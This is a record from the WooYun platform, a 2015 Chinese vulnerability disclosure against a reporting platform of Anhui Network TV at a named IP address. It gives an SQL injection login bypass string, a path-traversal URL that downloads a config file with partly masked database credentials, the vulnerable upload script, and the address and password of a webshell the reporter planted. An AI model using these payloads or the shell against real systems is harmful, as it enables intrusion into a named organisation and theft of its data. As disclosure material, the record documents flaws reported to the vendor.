{"id": 27019, "wybug_id": "wooyun-2015-0127025", "wybug_title": "安徽网络电视台某爆料平台漏洞合集(已shell)", "wybug_corp": "安徽网络电视台", "wybug_author": "Azui", "wybug_date": "2015-07-16 14:08", "wybug_open_date": "2015-09-02 09:36", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向公众公开  简要描述： 安徽网络电视台某站漏洞合集,已shell可内网 详细说明：  http://61.191.199.41/后台注入：http://61.191.199.41/Manage/default.php           admin'or '1'='1  a\n\n进后台翻了下 又发现了个任意下载任意下载：http://61.191.199.41/Manage/downloads.php?FileName=../configs.inc.php\t$dbhost = 'localhost';\t\t\t// 数据库服务器\t$dbuser = '***';\t\t\t\t// 数据库用户名\t$dbpwd = '****@ahtv2015';\t\t\t\t// 数据库密码\t$dbname = '****';\t\t$charset = 'gbk';\t下了代码审计下，根本没过滤，前台上传直接GETshellupload:http://61.191.199.41/tzl/upload.php\n<?phpSession_Start();if (isset($_FILES[\"Filedata\"]) || !is_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"]) || $_FILES[\"Filedata\"][\"error\"] != 0) {\t$upload_file = $_FILES['Filedata'];\t$file_info   = pathinfo($upload_file['name']);\t$file_type   = $file_info['extension'];\t$name1=md5(uniqid($_FILES[\"Filedata\"]['name'])). '.' . $file_info['extension'];\t$save        = 'uploads/' . $name1 ;\t$name        = $_FILES['Filedata']['tmp_name'];\t\tif (!move_uploaded_file($name, $save)) {\t\texit;\t}\t//$tmp=$_SESSION[\"tmp\"]=$_FILES['Filedata']['name'];\t//$_SESSION[\"$tmp\"]=$name1;\techo $name1;\t//将数组的输出存起来以供查看\t$fileName = 'test.txt';\t$postData = var_export($file_info, true);\t$file     = fopen('' . $fileName, \"w\");\tfwrite($file,$postData);\tfclose($file);}\nshell地址：http://61.191.199.41/tzl/uploads/8a444b192002a932cc4825b288308458.php 密码wooyun本来想内网渗透一下的，太卡了就算了.    漏洞证明：  \n\n   修复方案：  代码升级   版权声明：转载请注明来源 Azui@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-07-19 09:34 厂商回复： 感谢,已经将漏洞提交给相应的开发人员. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}